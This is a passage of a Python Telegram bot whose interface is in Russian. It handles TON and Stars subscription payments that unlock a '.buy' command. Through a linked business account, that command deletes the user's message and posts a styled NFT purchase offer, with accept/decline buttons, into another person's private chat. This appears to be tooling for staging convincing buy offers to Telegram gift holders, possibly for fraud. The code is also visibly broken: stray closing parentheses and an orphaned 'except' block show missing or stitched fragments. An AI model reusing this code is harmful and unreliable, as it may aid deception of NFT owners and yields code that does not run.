            "SELECT * FROM payments WHERE status='pending' ORDER BY created_at ASC"
        )
        pending = await cur.fetchall()
        now = int(time.time())

        for payment in pending:
            if int(payment["expires_at"]) < now:
                await db.execute("UPDATE payments SET status='expired' WHERE invoice_id=?", (payment["invoice_id"],))
                continue

            expected_comment = payment["comment"].strip()
            expected_amount = int(payment["amount_nano"])

            # Claim this invoice before doing the blockchain match. This prevents
            # the background watcher and the manual "Проверить оплату" button
            # from processing the same TON invoice concurrently.
            claim = await db.execute(
                "UPDATE payments SET status='processing' WHERE invoice_id=? AND status='pending'",
                (payment["invoice_id"],),
            )
            if claim.rowcount != 1:
                continue
            await db.commit()

            matched = False
            for tx in transactions:
                in_msg = tx.get("in_msg") or {}
                # v3 transactions are already filtered by account; v2 still gets
                # an explicit destination guard when it is present.
                # v3 /transactions is already queried for the configured account.
                # Do not compare destination strings directly: TON addresses can be
                # represented in friendly and raw forms.

                value_raw = in_msg.get("value", 0)
                try:
                    value = int(value_raw or 0)
                except (TypeError, ValueError):
                    continue
                if value != expected_amount:
                    continue

                comment = decode_payment_comment(in_msg)
                if comment != expected_comment:
                    continue

                tx_hash = str(
                    ((tx.get("transaction_id") or {}).get("hash") or tx.get("hash") or in_msg.get("hash") or "")
                ).strip()
                if not tx_hash:
                    continue

                cur2 = await db.execute("SELECT 1 FROM payments WHERE tx_hash=? AND status='paid'", (tx_hash,))
                if await cur2.fetchone():
                    continue

                # Use the days captured when the invoice was created. This prevents
                # editing/deleting a product after payment from changing the purchased term.
                if payment["days"] is not None:
                    days = int(payment["days"])
                else:
                    product_id = payment["product_id"]
                    if product_id:
                        product = await get_product(int(product_id))
                        days = int(product["days"]) if product else int(await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS)))
                    else:
                        days = int(await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS)))

                user_id = int(payment["user_id"])
                cur3 = await db.execute("SELECT expires_at FROM subscriptions WHERE user_id=?", (user_id,))
                sub = await cur3.fetchone()
                base = max(now, int(sub["expires_at"])) if sub else now
                expires = base + days * 86400
                await db.execute(
                    "INSERT INTO subscriptions(user_id, expires_at, source) VALUES(?, ?, 'payment') "
                    "ON CONFLICT(user_id) DO UPDATE SET expires_at=excluded.expires_at, source='payment'",
                    (user_id, expires),
                )
                await db.execute("UPDATE payments SET status='paid', tx_hash=? WHERE invoice_id=?", (tx_hash, payment["invoice_id"]))
                await db.commit()
                matched = True

                try:
                    await bot.send_message(
                        user_id,
                        f"<b>Оплата получена.</b>\nДоступ к .buy выдан на {days} дн.\n\n"
                        f"Действует до: <code>{time.strftime('%d.%m.%Y %H:%M', time.localtime(expires))}</code>",
                    )
                except Exception as notify_error:
                    logger.info("PAYMENT NOTIFY ERROR | user=%s | %s", user_id, notify_error)

                logger.info("TON PAYMENT CONFIRMED | user=%s | invoice=%s | tx=%s | amount_nano=%s", user_id, payment["invoice_id"], tx_hash, value)
                break

            if not matched:
                await db.execute("UPDATE payments SET status='pending' WHERE invoice_id=? AND status='processing'", (payment["invoice_id"],))
                await db.commit()
    finally:
        await db.close()


async def payment_watcher():
    while True:
        await check_payments_once()
        await asyncio.sleep(PAYMENT_CHECK_INTERVAL)


async def create_stars_invoice(user_id, product_id):
    product = await get_product(product_id)
    if not product or not int(product["active"]):
        raise ValueError("Товар недоступен")
    stars = int(product["stars_price"])
    if stars <= 0:
        raise ValueError("Цена в Stars должна быть больше 0")

    # Include the price in the bot-generated payload so pre-checkout can be
    # answered immediately without a database round-trip. Telegram requires
    # the answer within 10 seconds.
    payload = f"SUBSTAR:{product_id}:{user_id}:{stars}:{int(product['days'])}:{secrets.token_hex(8)}"
    await bot.send_invoice(
        chat_id=user_id,
        title=str(product["name"])[:32],
        description=f"Доступ к .buy на {int(product['days'])} дн.",
        payload=payload,
        currency="XTR",
        prices=[LabeledPrice(label=str(product["name"])[:32], amount=stars)],
        # provider_token is intentionally omitted for Telegram Stars.
    )
    return payload


# ============================================================
# BOT
# ============================================================

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)

dp = Dispatcher(storage=MemoryStorage())


@dp.pre_checkout_query()
async def process_pre_checkout(query: PreCheckoutQuery):
    """Answer Stars pre-checkout without slow DB/API work."""
    try:
        parts = query.invoice_payload.split(":")
        if len(parts) != 6 or parts[0] != "SUBSTAR":
            await query.answer(ok=False, error_message="Некорректный платёж.")
            return
        product_id = int(parts[1])
        owner_id = int(parts[2])
        expected_stars = int(parts[3])
        int(parts[4])  # purchased term snapshot
        if owner_id != query.from_user.id:
            await query.answer(ok=False, error_message="Платёж не принадлежит этому пользователю.")
            return
        if query.currency != "XTR" or int(query.total_amount) != expected_stars:
            await query.answer(ok=False, error_message="Цена товара изменилась. Создайте новый счёт.")
            return
        # Product availability/price is checked again after successful payment.
        # The payload itself is generated by this bot and cannot be edited by the buyer.
        await query.answer(ok=True)
    except Exception:
        logger.exception("STARS PRE-CHECKOUT ERROR")
        try:
            await query.answer(ok=False, error_message="Не удалось проверить платёж. Создайте новый счёт.")
        except Exception:
            pass


@dp.message(F.successful_payment)
async def process_successful_stars_payment(message: Message):
    await register_internal_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
    payment = message.successful_payment
    if not payment or payment.currency != "XTR":
        return
    try:
        parts = payment.invoice_payload.split(":")
        if len(parts) != 6 or parts[0] != "SUBSTAR" or int(parts[2]) != message.from_user.id:
            logger.warning("INVALID STARS PAYLOAD | user=%s | payload=%s", message.from_user.id, payment.invoice_payload)
            return
        product_id = int(parts[1])
        payload_stars = int(parts[3])
        payload_days = int(parts[4])
        if payload_days <= 0 or payload_days > 3650:
            logger.warning("INVALID STARS DAYS | user=%s", message.from_user.id)
            return
        if int(payment.total_amount) != payload_stars:
            logger.warning("STARS PAYLOAD AMOUNT MISMATCH | user=%s", message.from_user.id)
            return

        product = await get_product(product_id)
        # A successful invoice remains payable even if the admin changed/disabled/deleted
        # the product after the invoice was issued. The payload contains the purchased
        # price and term snapshot, while the charge itself is the source of truth.
        if product and int(product["stars_price"]) != payload_stars:
            logger.warning("STARS PRODUCT PRICE CHANGED AFTER INVOICE | user=%s | product=%s", message.from_user.id, product_id)
            # Do not reject an already issued invoice; its payload is authoritative.

        charge_id = payment.telegram_payment_charge_id
        db = await db_connect()
        try:
            cur = await db.execute("SELECT 1 FROM stars_payments WHERE telegram_charge_id=? OR payment_id=?", (charge_id, charge_id))
            if await cur.fetchone():
                return
            now = int(time.time())
            cur = await db.execute("SELECT expires_at FROM subscriptions WHERE user_id=?", (message.from_user.id,))
            row = await cur.fetchone()
            base = max(now, int(row["expires_at"])) if row else now
            expires = base + payload_days * 86400
            await db.execute(
                "INSERT INTO subscriptions(user_id, expires_at, source) VALUES(?, ?, 'stars') "
                "ON CONFLICT(user_id) DO UPDATE SET expires_at=excluded.expires_at, source='stars'",
                (message.from_user.id, expires),
            )
            await db.execute(
                "INSERT INTO stars_payments(payment_id,user_id,product_id,stars_price,created_at,status,telegram_charge_id) VALUES(?,?,?,?,?,?,?)",
                (charge_id, message.from_user.id, product_id, int(payment.total_amount), now, "paid", charge_id),
            )
            await db.commit()
        finally:
            await db.close()

        await message.answer(
            f"<b>Оплата Stars получена.</b>\nДоступ к .buy выдан на {payload_days} дн.\n\n"
            f"Действует до: <code>{time.strftime('%d.%m.%Y %H:%M', time.localtime(expires))}</code>"
        )
    except Exception:
        logger.exception("STARS PAYMENT ERROR | user=%s", message.from_user.id)


async def access_denied_text(user_id):
    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
    return (
        "<b>Доступ закрыт.</b>\n\n"
        f"Подписка: <b>{price} TON</b> на <b>{days} дн.</b>\n\n"
        "Открой бота и нажми «Купить подписку»."
    )


# ============================================================
# BUSINESS MESSAGE
# ============================================================

@dp.business_message()
async def handle_business_message(message: Message):
    connection_id = message.business_connection_id
    if not connection_id:
        return
    if not message.text:
        return
    if not message.chat:
        return
    if message.chat.type != "private":
        return

    command = message.text.strip()
    if not command.lower().startswith(".buy"):
        return

    # Проверка платного/бесплатного доступа
    try:
        conn = await bot.get_business_connection(
            business_connection_id=connection_id
        )
        owner = conn.user

        if not await has_access(owner.id):
            logger.warning("ACCESS DENIED | user_id=%s | username=%s", owner.id, owner.username)
            try:
                await bot(
                    SendMessage(
                        chat_id=message.chat.id,
                        text=await access_denied_text(owner.id),
                        business_connection_id=connection_id,
                    )
                )
            except Exception as access_error:
                logger.warning("ACCESS DENIED MESSAGE ERROR: %s", access_error)
            return

        await register_internal_user(owner.id, owner.username, owner.first_name)
        logger.info(
            "BUYER RESOLVED | id=%s | username=%s | name=%s",
            owner.id, owner.username, owner.first_name,
        )
    except Exception as error:
        logger.warning("CANNOT GET BUSINESS CONNECTION: %s", error)
        return

    lag = time.time() - message.date.timestamp()
    logger.info("UPDATE LAG: %.2f sec", lag)

    data = parse_buy_command(command)
    if data is None:
        logger.warning("INVALID .BUY COMMAND: %s", command)
        return

    settings = await get_user_settings(owner.id)
    args_lower = [part.lower() for part in command.split()[3:]]
    explicit_lang = any(part in {"ru", "en", "ar", "zh", "cn", "kit"} for part in args_lower)
    explicit_timer = any(part in {"6", "6h", "6ч", "12", "12h", "12ч"} for part in args_lower)
    if not explicit_lang and settings["language"] in TEXTS:
        data["language"] = settings["language"]
    if not explicit_timer and int(settings["timer_hours"]) in (6, 12):
        data["timer_hours"] = int(settings["timer_hours"])
    data["buyer"] = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)

    order_id = generate_order_id()
    data["order_id"] = order_id
    OFFERS[order_id] = dict(data)

    use_premium = USE_PREMIUM_EMOJI
    chat_id = message.chat.id
    nft_url = data["nft"]["url"]
    message_id = message.message_id

    async def delete_command():
        t = time.perf_counter()
        try:
            ok = await bot(
                DeleteBusinessMessages(
                    business_connection_id=connection_id,
                    message_ids=[message_id],
                )
            )
            logger.info("DELETE took %.2f sec (ok=%s)", time.perf_counter() - t, ok)
            return bool(ok)
        except Exception as error:
            if "not found" in str(error).lower():
                logger.info("COMMAND ALREADY DELETED")
                return True
            logger.error("DELETE ERROR: %s", error)
            return False

    async def send_offer():
        nonlocal use_premium
        t = time.perf_counter()

        for _ in range(3):
            offer_text, keyboard = create_offer(
                data, premium=use_premium, order_id=order_id
            )
            try:
                sent = await bot(
                    SendMessage(
                        chat_id=chat_id,
                        text=offer_text,
                        business_connection_id=connection_id,
                        reply_markup=keyboard,
                        link_preview_options=LinkPreviewOptions(
                            is_disabled=False,
                            url=nft_url,
                            show_above_text=True,
                        ),
                    )
                )
                OFFERS[order_id]["message_id"] = sent.message_id
                OFFERS[order_id]["connection_id"] = connection_id
                OFFERS[order_id]["expires_at"] = 4102444800  # offer has no expiration timer
                OFFERS[order_id]["owner_user_id"] = owner.id
                OFFERS[order_id]["chat_id"] = chat_id
                await save_user_offer(order_id, owner.id, data, "active", sent.message_id, connection_id, chat_id, OFFERS[order_id]["expires_at"])
                await ensure_user_settings(owner.id)
                logger.info(
                    "OFFER SENT | order=%s | language=%s | premium=%s | took %.2f sec",
                    order_id, data["language"], use_premium, time.perf_counter() - t,
                )
                return True
            except TelegramRetryAfter as error:
                logger.warning("FLOOD LIMIT: retry after %s sec", error.retry_after)
                await asyncio.sleep(error.retry_after)
            except TelegramBadRequest as error:
                if use_premium:
                    logger.warning("PREMIUM EMOJI REJECTED: %s | fallback to plain", error)
                    use_premium = False
                    continue
                logger.error("SEND OFFER ERROR: %s", error)
                return False
            except Exception as error:
                logger.error("SEND OFFER ERROR: %s", error)
                return False
        return False

    t_all = time.perf_counter()
    if PARALLEL:
        await asyncio.gather(delete_command(), send_offer())
    else:
        await delete_command()
        await send_offer()

    logger.info("TOTAL handler time: %.2f sec", time.perf_counter() - t_all)


# ============================================================
# КНОПКИ ОФФЕРА — НЕ ЗАВИСЯТ ОТ БАЗЫ, ИСТОРИИ И ТАЙМЕРА
# ============================================================

def offer_data_from_callback(callback, language, order_id):
    """Восстанавливает данные прямо из исходного сообщения с кнопками."""
    message = callback.message
    text = message.text or message.caption or ""
    entities = message.entities or message.caption_entities or []

    nft_url = None
    for entity in entities:
        if getattr(entity, "type", None) == "text_link" and getattr(entity, "url", None):
            nft_url = entity.url
            break
    if not nft_url:
        preview = getattr(message, "link_preview_options", None)
        nft_url = getattr(preview, "url", None) if preview else None
    if not nft_url:
        match = re.search(r"https?://t\.me/nft/[A-Za-z0-9_-]+", text)
        nft_url = match.group(0) if match else None

    nft = parse_nft(nft_url) if nft_url else None
    if not nft:
        return None

    # Берём сумму из текста оффера; не используем БД, OFFERS или срок действия.
    amount_match = re.search(
        r"(?<!\w)(\d+(?:[.,]\d+)?)\s*(⭐️?|stars?|зв[её]зд\w*|gram|грам\w*|ستارز|星)?",
        text,
        re.IGNORECASE,
    )
    if not amount_match:
        return None
    amount = amount_match.group(1).replace(",", ".")
    unit = (amount_match.group(2) or "").lower()
    # При отсутствии явной единицы рядом с суммой проверяем маркер валюты
    # в исходном сообщении; не путаем Telegram с GRAM.
    # Определяем валюту по единице рядом с суммой, а не по всему тексту:
    # слово Telegram само содержит подстроку "gram".
    if unit.startswith("gram") or unit.startswith("грам") or unit.startswith("غرام"):
        currency = "gram"
    elif unit:
        currency = "stars"
    else:
        currency = "gram" if re.search(r"(?<![a-z])gram(?![a-z])|грам\w*|غرام|💎", text, re.IGNORECASE) else "stars"

    return {
        "nft": nft,
        "amount": amount,
        "currency": currency,
        "language": language,
        "timer_hours": OFFER_DURATION_HOURS,
        "buyer": OFFERS.get(order_id, {}).get("buyer") or DEFAULT_BUYER,
        "order_id": order_id,
        "accepted_at": time.time(),
    }


async def edit_original_offer_message(callback: CallbackQuery, text: str, reply_markup=None, link_preview_options=None):
    """Редактирует исходное сообщение оффера, в том числе бизнес-сообщение."""
    try:
        if callback.message.business_connection_id:
            return await callback.bot(
                EditMessageText(
                    business_connection_id=callback.message.business_connection_id,
                    chat_id=callback.message.chat.id,
                    message_id=callback.message.message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup,
                    link_preview_options=link_preview_options,
                )
            )
        return await callback.message.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
            link_preview_options=link_preview_options,
        )
    except Exception as e:
        logger.error("EDIT MESSAGE ERROR: %s", e)
        raise e
    )


@dp.callback_query(F.data.startswith("offer_decline"))
async def decline_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    lang = TEXTS[language]
    order_id = order_id_from_callback(callback.data)
    try:
        await edit_original_offer_message(callback, lang["cancelled"])
        await callback.answer()
        logger.info("OFFER DECLINED | order=%s", order_id)
        
        if order_id:
            await update_user_offer_status(order_id, "declined")
            
    except Exception as error:
        logger.exception("DECLINE ERROR | order=%s | %s", order_id, error)
        try:
            await callback.answer(f"Не удалось изменить сообщение: {str(error)[:180]}", show_alert=True)
        except Exception:
            pass


@dp.callback_query(F.data.startswith("offer_accept"))
async def accept_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    order_id = order_id_from_callback(callback.data)
    
    data = OFFERS.get(order_id)
    if not data:
        row = await get_user_offer(order_id)
        if row:
            data = json.loads(row["data_json"])
            data["order_id"] = order_id
            OFFERS[order_id] = data
            
    if not data:
        data = offer_data_from_callback(callback, language, order_id)
        
    if data is None:
        await callback.answer("Не удалось прочитать данные оффера.", show_alert=True)
        return
        
    await callback.answer("Проверьте личность покупателя и подтверждение оплаты до передачи NFT.", show_alert=True)
    
    try:
        await edit_original_offer_message(
            callback,
            text=create_accept_text(data),
            reply_markup=create_accept_keyboard(data),
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
        
        if order_id:
            await update_user_offer_status(order_id, "accepted")
            
    except Exception as error:
        logger.exception("OFFER ACCEPT EDIT FAILED | order=%s | %s", order_id, error)
        )
    except Exception:
        logger.exception("TEST OFFER EDIT FAILED | order=%s", order_id)


# ============================================================
# ПАНЕЛЬ ПОЛЬЗОВАТЕЛЯ
# ============================================================

@dp.message(F.text.in_({"/menu", "/panel"}))
async def user_panel_command(message: Message):
    if not await has_access(message.from_user.id):
        await message.answer(await access_denied_text(message.from_user.id))
        return
    await register_internal_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
    await ensure_user_settings(message.from_user.id)
    await render_user_panel(message)


@dp.callback_query(F.data == "user_panel")
async def user_panel_callback(callback: CallbackQuery):
    if not await has_access(callback.from_user.id):
        await callback.answer("Доступ закрыт", show_alert=True)
        return
    await render_user_panel(callback.message, edit=True)
    await callback.answer()


@dp.callback_query(F.data == "user_offers")
async def user_offers_callback(callback: CallbackQuery):
    rows = await get_user_offers(callback.from_user.id)
    if not rows:
        text = "<b>Мои офферы</b>\n\nОфферов пока нет."
    else:
        text = "<b>Мои офферы</b>\n\nВыберите оффер для управления."
    await callback.message.edit_text(text, reply_markup=user_offers_keyboard(rows))
    await callback.answer()


@dp.callback_query(F.data.startswith("user_offer:"))
async def user_offer_detail(callback: CallbackQuery):
    order_id = callback.data.split(":", 1)[1]
    row = await get_user_offer(order_id)
    if not row or int(row["owner_user_id"]) != callback.from_user.id:
        await callback.answer("Оффер не найден", show_alert=True)
        return
    data = json.loads(row["data_json"])
    text = (
        f"<b>{order_id}</b>\n\n"
        f"NFT: <a href=\"{data['nft']['url']}\">{data['nft']['name']} #{data['nft']['number']}</a>\n"
        f"Цена: <b>{data['amount']} {data['currency']}</b>\n"
        f"Язык: <b>{data.get('language', DEFAULT_LANGUAGE).upper()}</b>\n"
        f"Статус: <b>{offer_status_label(row['status'])}</b>"
    )
    buttons = []
    if row["status"] in {"declined", "accepted", "expired"}:
        buttons.append([InlineKeyboardButton(text="Повторить", style="success", callback_data=f"user_repeat:{order_id}")])
    buttons.append([InlineKeyboardButton(text="Назад", style="primary", callback_data="user_offers")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), disable_web_page_preview=True)
    await callback.answer()


@dp.callback_query(F.data.startswith("user_repeat:"))
async def user_repeat_callback(callback: CallbackQuery):
    order_id = callback.data.split(":", 1)[1]
    try:
        new_order = await repeat_user_offer(callback.from_user.id, order_id)
        await callback.message.edit_text(
            f"<b>Оффер {new_order} создан.</b>\n\nОн отправлен через последнее подключённое бизнес-соединение.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Мои офферы", style="primary", callback_data="user_offers")],
                [InlineKeyboardButton(text="В панель", style="primary", callback_data="user_panel")],
            ])
        )
        await callback.answer("Оффер отправлен")
    except Exception as error:
        await callback.answer(str(error)[:180], show_alert=True)


@dp.callback_query(F.data == "user_stats")
async def user_stats_callback(callback: CallbackQuery):
    rows = await get_user_offers(callback.from_user.id, 1000)
    counts = {"active":0,"accepted":0,"declined":0,"expired":0}
    for row in rows:
        counts[row["status"]] = counts.get(row["status"], 0) + 1
    total = len(rows)
    text = (
        "<b>Статистика</b>\n\n"
        f"Всего: <b>{total}</b>\n"
        f"Активных: <b>{counts['active']}</b>\n"
        f"Принято: <b>{counts['accepted']}</b>\n"
        f"Отклонено: <b>{counts['declined']}</b>\n"
        f"Истекло: <b>{counts['expired']}</b>"
    )
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Мои офферы", style="primary", callback_data="user_offers")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")],
    ]))
    await callback.answer()


@dp.callback_query(F.data == "user_quick_commands")
async def user_quick_commands_callback(callback: CallbackQuery):
    text = (
        "<b>Быстрые команды</b>\n\n"
        "<code>.buy ссылка цена ru</code>\n"
        "<code>.buy ссылка цена en</code>\n"
        "<code>.buy ссылка 150 stars ar</code>\n"
        "<code>.buy ссылка 10 gram ru</code>\n\n"
        "Язык можно сохранить в настройках и не указывать каждый раз."
    )
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Создать оффер", style="success", callback_data="user_create_offer")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")],
    ]))
    await callback.answer()


@dp.callback_query(F.data == "user_settings")
async def user_settings_callback(callback: CallbackQuery):
    settings = await get_user_settings(callback.from_user.id)
    lang = settings["language"].upper()
    notifications = "Включены" if int(settings["notifications"]) else "Выключены"
    text = f"<b>Настройки</b>\n\nЯзык: <b>{lang}</b>\nУведомления: <b>{notifications}</b>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Язык", style="primary", callback_data="user_set_language")],
        [InlineKeyboardButton(text="Уведомления", style="primary", callback_data="user_toggle_notifications")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")],
    ])
    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()


@dp.callback_query(F.data == "user_set_language")
async def user_set_language(callback: CallbackQuery):
    await callback.message.edit_text("<b>Язык</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Русский", style="primary", callback_data="user_lang:ru"), InlineKeyboardButton(text="English", style="primary", callback_data="user_lang:en")],
        [InlineKeyboardButton(text="العربية", style="primary", callback_data="user_lang:ar")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="user_settings")],
    ]))
    await callback.answer()


@dp.callback_query(F.data.startswith("user_lang:"))
async def user_lang_callback(callback: CallbackQuery):
    lang = callback.data.split(":", 1)[1]
    if lang not in TEXTS:
        lang = DEFAULT_LANGUAGE
    await set_user_setting(callback.from_user.id, "language", lang)
    await callback.answer("Язык сохранён")
    await user_settings_callback(callback)


@dp.callback_query(F.data == "user_toggle_notifications")
async def user_toggle_notifications(callback: CallbackQuery):
    settings = await get_user_settings(callback.from_user.id)
    value = 0 if int(settings["notifications"]) else 1
    await set_user_setting(callback.from_user.id, "notifications", value)
    await callback.answer("Уведомления обновлены")
    await user_settings_callback(callback)


@dp.callback_query(F.data == "user_create_offer")
async def user_create_offer(callback: CallbackQuery):
    if not await has_access(callback.from_user.id):
        await callback.answer("Доступ закрыт", show_alert=True)
        return
    row = await get_user_offers(callback.from_user.id, 1)
    if not row or not row[0]["connection_id"]:
        await callback.message.edit_text("Сначала отправьте хотя бы один .buy через подключённый бизнес-аккаунт, чтобы бот запомнил подключение.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")]]))
        await callback.answer()
        return
    USER_STATES[callback.from_user.id] = {"state":"create_nft", "connection_id":row[0]["connection_id"], "chat_id":int(row[0]["chat_id"])}
    await callback.message.edit_text("<b>Создать оффер</b>\n\nОтправьте ссылку на NFT.")
    await callback.answer()

# ============================================================
# ПОКУПКА ПОДПИСКИ
# ============================================================

@dp.message(F.text == "/start")
async def start_command(message: Message):
    await register_internal_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
    if message.from_user.id == ADMIN_ID:
        await message.answer("<b>Админ.</b> Используй /admin для панели управления.")
        return
    if await has_access(message.from_user.id):
        await ensure_user_settings(message.from_user.id)
        await render_user_panel(message)
        return
    products = await get_products()
    buttons = []
    for product in products:
        buttons.append([InlineKeyboardButton(
            text=f"{product['name']} — {format_ton(product['ton_price'])} TON / {product['stars_price']} Stars",
            style="primary",
            callback_data=f"buy_product:{product['id']}",
        )])
    if not buttons:
        await message.answer("<b>Товары пока не настроены.</b>")
        return
    await message.answer("<b>Доступ к .buy</b>\n\nВыберите подписку:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))


@dp.callback_query(F.data.startswith("buy_product:"))
async def buy_product(callback: CallbackQuery):
    await callback.answer()
    try:
        product_id = int(callback.data.split(":", 1)[1])
        product = await get_product(product_id)
        if not product or not int(product["active"]):
            await callback.message.edit_text("Товар недоступен.")
            return
        buttons = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"Оплатить {product['stars_price']} Stars", style="success", callback_data=f"buy_stars:{product_id}")],
            [InlineKeyboardButton(text=f"Оплатить {format_ton(product['ton_price'])} TON", style="success", callback_data=f"buy_ton:{product_id}")],
            [InlineKeyboardButton(text="Назад", style="primary", callback_data="buy_back")],
        ])
        await callback.message.edit_text(
            f"<b>{product['name']}</b>\n\nСрок: <b>{product['days']} дн.</b>\n"
            f"TON: <b>{format_ton(product['ton_price'])}</b>\n"
            f"Stars: <b>{product['stars_price']} ⭐</b>\n\nВыберите способ оплаты:",
            reply_markup=buttons,
        )
    except Exception:
        await callback.message.edit_text("Не удалось открыть товар.")


@dp.callback_query(F.data == "buy_back")
async def buy_back(callback: CallbackQuery):
    products = await get_products()
    buttons = [[InlineKeyboardButton(text=f"{p['name']} — {format_ton(p['ton_price'])} TON / {p['stars_price']} Stars", style="primary", callback_data=f"buy_product:{p['id']}")] for p in products]
    await callback.message.edit_text("<b>Доступ к .buy</b>\n\nВыберите подписку:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
    await callback.answer()


@dp.callback_query(F.data.startswith("buy_stars:"))
async def buy_stars(callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    try:
        product_id = int(callback.data.split(":", 1)[1])
        await create_stars_invoice(user_id, product_id)
        await callback.message.edit_text("<b>Счёт Stars отправлен.</b>\n\nОплатите его в сообщении Telegram. После успешной оплаты доступ выдастся автоматически.")
    except Exception as error:
        logger.exception("CREATE STARS INVOICE ERROR | user=%s", user_id)
        await callback.message.edit_text(f"<b>Не удалось создать счёт Stars.</b>\n\n{str(error)}")


@dp.callback_query(F.data.startswith("buy_ton:"))
async def buy_ton(callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    try:
        product_id = int(callback.data.split(":", 1)[1])
        invoice = await create_invoice(user_id, product_id)
    except Exception as error:
        logger.exception("CREATE TON INVOICE ERROR | user=%s", user_id)
        await callback.message.edit_text("<b>Не удалось создать TON-счёт.</b>\n\nПроверьте настройки оплаты в /admin.")
        return
    # Ссылка на Tonkeeper остаётся дополнительным удобством, но оплата не зависит от неё:
    # пользователь может перевести TON из любого кошелька по адресу и комментарию ниже.
    pay_url = f"https://app.tonkeeper.com/transfer/{invoice['address']}?amount={invoice['amount_nano']}&text={quote(invoice['comment'])}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть Tonkeeper", style="success", url=pay_url)],
        [InlineKeyboardButton(text="Проверить оплату", style="primary", callback_data=f"check_payment:{invoice['invoice_id']}")],
    ])
    product = await get_product(product_id)
    product_name = product['name'] if product else "Подписка"
    await callback.message.edit_text(
        f"<b>Оплата TON</b>\n\nТовар: <b>{product_name}</b>\n"
        f"Сумма: <b>{format_ton(invoice['amount'])} TON</b>\nСрок: <b>{invoice['days']} дн.</b>\n\n"
        "<b>Если у вас нет Tonkeeper:</b>\n"
        "1. Откройте любой TON-кошелёк и отправьте точную сумму на адрес ниже.\n"
        "2. В комментарий к переводу обязательно вставьте код без изменений. Без него платёж может не определиться автоматически.\n\n"
        f"Адрес получателя:\n<code>{invoice['address']}</code>\n\n"
        f"Сумма перевода: <code>{format_ton(invoice['amount'])} TON</code>\n"
        f"Комментарий: <code>{invoice['comment']}</code>\n\n"
        "После поступления платежа доступ выдастся автоматически. Если он не обновился, нажмите «Проверить оплату».",
        reply_markup=keyboard,
    )


@dp.callback_query(F.data.startswith("check_payment:"))
async def check_payment_callback(callback: CallbackQuery):
    invoice_id = callback.data.split(":", 1)[1]
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM payments WHERE invoice_id=?", (invoice_id,))
        payment = await cur.fetchone()
    finally:
        await db.close()
    if not payment or int(payment["user_id"]) != callback.from_user.id:
        await callback.answer("Платёж не найден", show_alert=True)
        return
    await check_payments_once()
    db = await db_connect()
    try:
        cur = await db.execute("SELECT status FROM payments WHERE invoice_id=?", (invoice_id,))
        fresh = await cur.fetchone()
    finally:
        await db.close()
    if fresh and fresh["status"] == "paid":
        await callback.message.edit_text("<b>Оплата подтверждена.</b> Доступ к .buy активен.")
        await callback.answer("Готово")
    elif fresh and fresh["status"] == "expired":
        await callback.answer("Счёт истёк. Создайте новый.", show_alert=True)
    else:
        await callback.answer("Платёж ещё не найден в блокчейне", show_alert=True)


# ============================================================
# АДМИН-ПАНЕЛЬ
# ============================================================

def admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Товары и цены", style="primary", callback_data="admin_products")],
        [InlineKeyboardButton(text="Настройки подписки", style="primary", callback_data="admin_settings")],
        [InlineKeyboardButton(text="Выдать бесплатно", style="success", callback_data="admin_free_add")],
        [InlineKeyboardButton(text="Восстановить подписки", style="success", callback_data="admin_restore_subs")],
        [InlineKeyboardButton(text="Забрать доступ", style="danger", callback_data="admin_revoke")],
        [InlineKeyboardButton(text="Бесплатный доступ", style="primary", callback_data="admin_free_list")],
        [InlineKeyboardButton(text="Платежи", style="primary", callback_data="admin_payments")],
        [InlineKeyboardButton(text="Принятые сделки", style="primary", callback_data="admin_accepted_deals")],
        [InlineKeyboardButton(text="Рассылка", style="primary", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="Статистика", style="primary", callback_data="admin_stats")],
    ])


def admin_only(user_id):
    return user_id == ADMIN_ID


@dp.message(F.text == "/admin")
async def admin_panel(message: Message):
    if not admin_only(message.from_user.id):
        return
    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
    await message.answer(
        "<b>🔧 Админ-панель</b>\n\n"
